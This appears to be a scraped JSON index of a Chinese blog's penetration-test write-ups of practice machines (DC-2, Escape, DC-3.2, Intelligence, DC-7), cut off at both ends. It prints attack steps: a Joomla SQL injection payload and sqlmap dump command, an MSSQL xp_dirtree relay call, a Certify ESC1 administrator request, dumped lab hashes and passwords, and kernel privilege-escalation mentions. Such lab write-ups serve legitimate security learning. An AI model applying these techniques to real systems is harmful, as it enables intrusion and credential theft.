href=\"http://dc-2/\"\u003ehttp://dc-2/\u003c/a\u003e \u0026ndash;enumerate u\u003c/p\u003e\n\u003cp\u003e发现三个用户\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbf9adfd72a35dd1d5017f877ee1574fe%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e爆破，常规的爆破字典爆不出来：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE354a18966df1d6436c6ab07759176347%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e翻查了一下网站，作者有提示：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE30cdbe1b13257d92c15a6d1a1a71f622%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ecewl收集密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE438749c3129825f749137f0ecb4e95b9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e爆破成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE512258a79a9923b8d2bcfac2ab23d94e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ejerry / adipiscing\u003c/p\u003e\n\u003cp\u003etom / parturient\u003c/p\u003e\n\u003cp\u003e登录web成功，但是由于权限不够无法getshell，也是卡了好久，才想起来可以去看看ssh端口：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8a67b3431c82f122fde4d4a279a19201%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e这里就有点恶心了，大部分命令不给用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1559754611604fc518be1cae7644f6e7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e提示说让我们切换到jerry用户，然后命令还是不给用，然后我尝试了vi提权的操作，发现是操作对了的，但是我没发现是命令没找到，我淦：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfffcf8d24c99e066c71290f921d68df9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe2ad70198e6b645d1cdca3824fd7419e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里就是命令无法找到了，而不是受限的环境了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5ea29d01f2528f7683b22f0afe9446a2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查看环境变量：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1c8967adfa44167bc760e3cb69a8eccb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e改变环境变量，理论上这步可以直接输入绝对路径来执行命令，如果你记得所有的命令路径的话：\u003c/p\u003e\n\u003cp\u003eexport PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbcfa77986cbf2831137dfa2cd2d9beb4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e切换到jerry，sudo提权，有gtfobins没啥好说的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE084998ea9d8216610103c86be6093be6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x023 DC-2"},{"content":"端口扫描 获取立足点 值得关注的端口：389，445，1433，5985\nsmb发现这个东西：\n发现sqlserver登录方式：\n连接成功：\n看了一圈儿，确实没东西了：\n最后无奈看了wp，属实没想到，sqlserver也能玩儿relay：\nEXEC MASTER.sys.xp_dirtree \u0026lsquo;\\10.10.16.12\\test\u0026rsquo;, 1, 1\n很快就破解了：\n可以直接登录winrm:\nbloodhound:\n无法分析出可用的路径：\nwinpeass也没能发现什么有用的东西，看了一下wp，呐应该是思路的缺失了，查看sqlserver的日志文件：\n咋说呢，错误日志一般是不会记录错误密码的，但是会记录错误用户：\n感觉还是有点缺乏想象力，这里应该是模仿用户输入错误了密码为用户名，导致日志被记录：\n是远程组的：\n登录看看：\n很好，bloodhound有局限，ADCS的相关内容其实也有了解，但是没想到这一点：\nESC1：\n.\\Certify.exe request /ca:sequel.htb\\sequel-DC-CA /template:UserAuthentication /altname:administrator\n复制出来，提取：\n获取hash:\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x023-escape/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE240fca89a47034f53abe9633404aa2bdimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE879f954d7fb881ade1d7bc17e7aac2e4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf7aa426ecdb6ae1e15d35397b13941d4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e值得关注的端口：389，445，1433，5985\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE86f4b2d645b49a6f29f43ef449edc719image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esmb发现这个东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE622d9e2dcc45ef56d812810e9a62425eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现sqlserver登录方式：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf6f86c814237304e9ae50205f8812cadimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e连接成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEfcf3e587b7fdca0e5f97b907476c477fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看了一圈儿，确实没东西了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE93c53ee64eda152b3a85dd37a474591cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e最后无奈看了wp，属实没想到，sqlserver也能玩儿relay：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb4410d8a0f9b2db975f55218ef5b7042image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eEXEC MASTER.sys.xp_dirtree \u0026lsquo;\\10.10.16.12\\test\u0026rsquo;, 1, 1\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE11226968d518189f35c30b446f9d04c1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e很快就破解了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2a5fbd741986f884e6e00480ac611c41image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e可以直接登录winrm:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2527100e2c4da7b9bddff00d8ba82ec6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe72515d5df9229358952cef420e422dcimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ebloodhound:\u003c/p\u003e\n\u003cp\u003e无法分析出可用的路径：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEed4a4ebd002b6571a549c3bb96629870image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewinpeass也没能发现什么有用的东西，看了一下wp，呐应该是思路的缺失了，查看sqlserver的日志文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3444a296c8840c0c82d03c468cf4a537image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e咋说呢，错误日志一般是不会记录错误密码的，但是会记录错误用户：\u003c/p\u003e\n\u003cp\u003e感觉还是有点缺乏想象力，这里应该是模仿用户输入错误了密码为用户名，导致日志被记录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEec28db1f6252dfbd0177e8309ebf054fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e是远程组的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd7a2ddc8d65b75c8cd4d35e0720513e6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e登录看看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE48bee9d46c173643897e2ae0c40d3868image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e很好，bloodhound有局限，ADCS的相关内容其实也有了解，但是没想到这一点：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc57b1c3d18a5c33ea7055cb65593cbcbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eESC1：\u003c/p\u003e\n\u003cp\u003e.\\Certify.exe request /ca:sequel.htb\\sequel-DC-CA /template:UserAuthentication /altname:administrator\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb1b4d27cb784d2bbdaac9777449b7e84image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e复制出来，提取：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2ce912c75e9c2ad1492c36814f69d5f8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X023 Escape"},{"content":"开机遇到报错，修改以下配置：\n端口扫描 渗透 使用joomale cms，通过joomla扫描发现版本和组件，可能存在已知漏洞：\njoomscan.pl扫描结果，版本号为3.7.0\nJoomlaScan扫描结果，以下为相关组件：\nPOC如下：\n/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)\nsqlmap查账号密码，过程非常复杂，贴上最后的命令：\nsqlmap -u \u0026#34;http://192.168.1.134/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=xxx\u0026#34; -D joomladb -T \u0026#39;#__users\u0026#39; -C name,email,id,params,password,username --dump admin | freddy@norealaddress.net | 629 | {\u0026ldquo;admin_style\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;admin_language\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;language\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;editor\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;helpsite\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;timezone\u0026rdquo;:\u0026quot;\u0026quot;} | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin\n查询cmd5网站：\n付费记录：\njohn默认字典就跑出来了，就这还想要我的钱？\n修改模板：\n但是这里不知道为啥，访问error.php访问不到，我直接改了index.php，然后访问主页就可以了，实战建议自己添加一个php文件：\n提权： 有GCC，可以考虑内核提权：\n小插曲，内核提权有风险，机器打崩了\n这脏牛就没成功过，离谱：\n2021-4034是真的好用：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x024-dc-3.2/","summary":"\u003cp\u003e开机遇到报错，修改以下配置：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4cd164de68cafa73ead52528439ebda6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc724cd1c56a1136f76aef7ed843bc672%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE936ff0c59005305217e93f18889523ef%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe03763fdd8beb0e52b175e5097d00217%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用joomale cms，通过joomla扫描发现版本和组件，可能存在已知漏洞：\u003c/p\u003e\n\u003cp\u003ejoomscan.pl扫描结果，版本号为3.7.0\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEadd720ccfc02d6865b640a40a1c3d915%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eJoomlaScan扫描结果，以下为相关组件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1a265df724d312d3851b0e701efab813%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ePOC如下：\u003c/p\u003e\n\u003cp\u003e/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE22b3fac5c697ab4833d62cd183a19882%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esqlmap查账号密码，过程非常复杂，贴上最后的命令：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esqlmap -u \u0026#34;http://192.168.1.134/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=xxx\u0026#34; -D joomladb -T \u0026#39;#__users\u0026#39; -C name,email,id,params,password,username --dump\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE23bd1c50cc4d1fd1d621d2abe8aef309%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eadmin  | \u003ca href=\"mailto:freddy@norealaddress.net\"\u003efreddy@norealaddress.net\u003c/a\u003e | 629 | {\u0026ldquo;admin_style\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;admin_language\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;language\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;editor\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;helpsite\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;timezone\u0026rdquo;:\u0026quot;\u0026quot;} | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin\u003c/p\u003e\n\u003cp\u003e查询cmd5网站：\u003c/p\u003e\n\u003cp\u003e付费记录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd66874bd5bc5c4ef2a4254136e2df059%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ejohn默认字典就跑出来了，就这还想要我的钱？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE35902ccbbe3e3a0dea4a732d5ff1d18e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e修改模板：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5843a4d128f3583d5e934dbc1ba05f42%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是这里不知道为啥，访问error.php访问不到，我直接改了index.php，然后访问主页就可以了，实战建议自己添加一个php文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE90aa0d2e451366346e5467dbcc84d028%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权：\u003c/h1\u003e\n\u003cp\u003e有GCC，可以考虑内核提权：\u003c/p\u003e\n\u003cp\u003e小插曲，内核提权有风险，机器打崩了\u003c/p\u003e\n\u003cp\u003e这脏牛就没成功过，离谱：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe6ab3817b26b881ff584c4312bfe5ee2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e2021-4034是真的好用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdbe123b2aa2919afa1c94e8aecfb578c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe15544377e89ac3397ee734f7e9b8c06%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x024 DC 3.2"},{"content":"端口扫描 获取立足点 根据端口开放情况进行判断，值得关注的端口：80、389、445、5985\n先看445：\n389：\n那就只剩下80了：\n只有一个documents目录，whatweb识别一下：\n但是好像也没有历史漏洞，再看看这个pdf文件，发现可以枚举：\n不能挨个看吧，我挨个看了：\nhttp://10.10.10.248/documents/2020-06-04-upload.pdf\n默认密码：\nNewIntelligenceCorpUser9876\n拿到密码，想到的就是密码喷洒：\n但是使用自带的字典失败了：\n但是有个地方是存在账号的，那就是文件的撰写人:\n写个bash脚本，下载了2020年的所有文件：\n这里明白了，有相关工具如果提供了详细参数的，建议就使用详细参数看看吧：\n应该是工具或者环境的问题，这里没法爆破成功：\n带上详细参数看看：\n并非是密码错误，也是就说这个账号密码应该是正确的，只是请求kdc出错了：\n拿到了账号密码，但是看了一下\nldap和winrm都不能登录：\n试试smb:\n大概看了一下这个脚本，他说每5分钟执行一次，请求一些东西，但是怎么利用呢，猜测是relay，再接着看：\n发现flag:\n后面看了一下wp，确实知识面欠缺，需要添加一个dns解析，而且域内是默认可以添加的，有合法身份即可：\n添加dns记录后，relay:\n破解：\n不让登录：\n不过不要紧，正常渗透就行了：\n提权 bloodhound已经给出了比较完善的路线了：\npython gMSADumper.py -u \u0026lsquo;Ted.Graves\u0026rsquo; -p \u0026lsquo;Mr.Teddy\u0026rsquo; -d \u0026lsquo;intelligence.htb\u0026rsquo;\nUsers or groups who can read password for svc_int$:\nDC$itsupportsvc_int$:::e0dcda8d93bf71a6352ea7803c8f17f1svc_int$:aes256-cts-hmac-sha1-96:fd6235dbfd8a560d17433b22022633ed7188588277cf4d174f6582daf2c5333fsvc_int$:aes128-cts-hmac-sha1-96:059ae234e725682d00c3c278b3cff01b\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x024-intelligence/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf4f9356afcea710b2f0901fc2a4add22image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEfa7745219d387cc800a4386832e34a59image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE644bca0295f9adbcadfd2d37e73cf0fbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e根据端口开放情况进行判断，值得关注的端口：80、389、445、5985\u003c/p\u003e\n\u003cp\u003e先看445：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEfa6384699fc73d26bfc5c37730a2a038image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e389：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa1db95b74dea5f6707387458a8d69784image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那就只剩下80了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe55cbf3d3369f5348c7378bae8482f7dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e只有一个documents目录，whatweb识别一下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbbe3541eb52e7d4d102a8bc7d586f862image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是好像也没有历史漏洞，再看看这个pdf文件，发现可以枚举：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7485d8a1d87462f40454ba059af38274image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e不能挨个看吧，我挨个看了：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"http://10.10.10.248/documents/2020-06-04-upload.pdf\"\u003ehttp://10.10.10.248/documents/2020-06-04-upload.pdf\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e默认密码：\u003c/p\u003e\n\u003cp\u003eNewIntelligenceCorpUser9876\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE03c57ed047ab86d62173da91b40be201image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e拿到密码，想到的就是密码喷洒：\u003c/p\u003e\n\u003cp\u003e但是使用自带的字典失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6725a70ab9c274d66493a7f6d799ae72image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是有个地方是存在账号的，那就是文件的撰写人:\u003c/p\u003e\n\u003cp\u003e写个bash脚本，下载了2020年的所有文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE059979f0e61bd1b4e32d4910b8baecb2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里明白了，有相关工具如果提供了详细参数的，建议就使用详细参数看看吧：\u003c/p\u003e\n\u003cp\u003e应该是工具或者环境的问题，这里没法爆破成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE94978b586d88e74a2b82e75734479c35image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e带上详细参数看看：\u003c/p\u003e\n\u003cp\u003e并非是密码错误，也是就说这个账号密码应该是正确的，只是请求kdc出错了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE58ec1d32c8aca8572c6d76ff5de63726image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e拿到了账号密码，但是看了一下\u003c/p\u003e\n\u003cp\u003eldap和winrm都不能登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE1a1d57adb84c7ea3de1f7411e9b48fa1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e试试smb:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbb836cee37273e3f81a3a46b0c5b5bbeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e大概看了一下这个脚本，他说每5分钟执行一次，请求一些东西，但是怎么利用呢，猜测是relay，再接着看：\u003c/p\u003e\n\u003cp\u003e发现flag:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5c55f4785d655114866dd7675f33200bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面看了一下wp，确实知识面欠缺，需要添加一个dns解析，而且域内是默认可以添加的，有合法身份即可：\u003c/p\u003e\n\u003cp\u003e添加dns记录后，relay:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf7c343b450a1772e87fc1e735ee208b6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e破解：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE1a504314810bc96ac98c94b0275adaafimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e不让登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEccd1611c31186d956fef5100cf44069cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e不过不要紧，正常渗透就行了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6eb416c86bb9f58e7aab3e73c7fc2d33image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X024 Intelligence"},{"content":"端口扫描 渗透 drupal准确版本：8.7.6\n作者提示要跳出思维，暂时不要考虑爆破：\n好好好，我打死也没想到要这样子跳出思维：\n去github上搜索这个用户名：\n找到数据库配置文件：\n由于没开mysql只能先试试ssh:\n提权 这靶机完全翻车了，提权也很离谱，首先是家目录下面有一个非正常文件，叫mbox，看一下发现计划任务字样：\n查看文件，大致内容为清空文件夹、备份数据库，打包，修改权限，然后删除，看样子，理论上，我是有机会在计划任务执行期间复制website.sql的：\n理论上行得通，这又何尝不是一种条件竞争呢，写一个shell脚本试试：\n#!/bin/bash\rfor i in {1..10000}\rdo\rcp website.sql ../\rsleep 1\rdone 成功了：\n内容太多了，不好看，罢了，我有数据库密码：\n算了，搞了半天，数据库连不上，其实想看数据库主要也是想看web后台密码。\n直接修改sh，是没修改权限的，但是www-data有：\n然后想去拿个webshell，直接修改php文件，然后我一看web目录又没权限，再次翻车：\n无奈看wp，修改drupal的密码：\n然后登录后台去修改php代码，添加php模块，url:https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz\n开启：\n修改代码，保存后自动执行\n接下来就简单了，去修改backups.sh:\n提权成功\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x025-dc-7/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf727e4cac6c3d940ff1aac06aee664de%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb1527c0ea7168f2d51b2b4158dbdef95%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003edrupal准确版本：8.7.6\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" 